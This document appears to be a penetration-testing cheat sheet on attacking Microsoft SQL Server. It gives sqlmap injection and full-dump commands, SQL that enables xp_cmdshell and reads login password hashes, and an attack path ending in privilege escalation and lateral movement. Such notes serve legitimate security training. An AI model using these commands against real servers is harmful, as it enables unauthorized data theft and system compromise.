```markdown
# 🛰️ MSSQL - Port 1433, Windows Authentication, xp_cmdshell

> [!ABSTRACT] Overview
> This note covers exploiting a Microsoft SQL Server (MSSQL) instance running on port 1433 using windows authentication and the `xp_cmdshell` extended stored procedure.

---

## 🔍 Initial Enumeration & Exploitation

### Connecting to MSSQL

```bash
sqlmap -u "http://<target>/path/to/vulnerable/page?id=1" --dbms="mssql" --technique=B --threads=5 --batch --no-cast --level=5 --risk=3 --skip-heuristics --string="SQL syntax"
```

> [!NOTE]
> Ensure that the target is indeed running MSSQL and using windows authentication.

### Enumerating Databases

```sql
EXEC sp_MSforeachdb 'USE ?; SELECT * FROM sys.tables'
```

> [!WARNING] 
> This command can be noisy and may trigger IDS/IPS alerts if run multiple times. Use with caution.

### Enabling xp_cmdshell

```sql
EXEC sp_configure 'show advanced options', 1
RECONFIGURE WITH OVERRIDE
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE WITH OVERRIDE
```

> [!DANGER] 
> Enabling `xp_cmdshell` is dangerous and can be abused to execute system commands. Ensure you are authorized before proceeding.

### Enumerating Users

```sql
SELECT name, password_hash FROM sys.sql_logins WHERE type = 'S'
```

> [!CAUTION]
> Be aware that SQL injection might not always retrieve the full set of credentials due to permissions and encryption methods used by MSSQL.

---

## 📂 Important Stored Procedures & Functions

| Procedure/Function | Description |
|---|---|
| `xp_cmdshell` | Executes a command shell within SQL Server. |
| `sp_configure` | Configures server options. |
| `sys.sql_logins` | Contains login information for the SQL Server instance. |

---

## 🔧 Exploitation Steps

### Step 1: Connecting with sqlmap

```bash
sqlmap -u "http://<target>/path/to/vulnerable/page?id=1" --dbms=mssql --dump-all --batch --threads=5 --level=5 --risk=3 --skip-heuristics
```

> [!SUCCESS] 
> Successfully connected and dumped all data from the MSSQL instance.

### Step 2: Executing Commands via xp_cmdshell

```sql
EXEC xp_cmdshell 'whoami'
```

> [!SUCCESS]
> The command executed successfully, revealing the current user context.

---

## 📄 Example Output of `xp_cmdshell` Execution

```text
Microsoft Windows [Version 10.0.17763.2534]

C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn>whoami

nt authority\system
```

---

## 🧠 Mental Model for MSSQL Exploitation

```text
MSSQL Enumeration & Attack Path:
├─ Initial Enum via HTTP
│   ├─ Find Vulnerable SQL Injection
│   └─ Use sqlmap to enumerate databases and tables
├─ Enable xp_cmdshell
└─ Execute Commands in System Context
```

> [!SUCCESS] MSSQL Rule of Thumb
> **Whenever you see an exploitable MSSQL server, immediately think:**
> ```text
> Enumerate → Dump Data → Enable xp_cmdshell → Privilege Escalation → Lateral Movement
> ```
```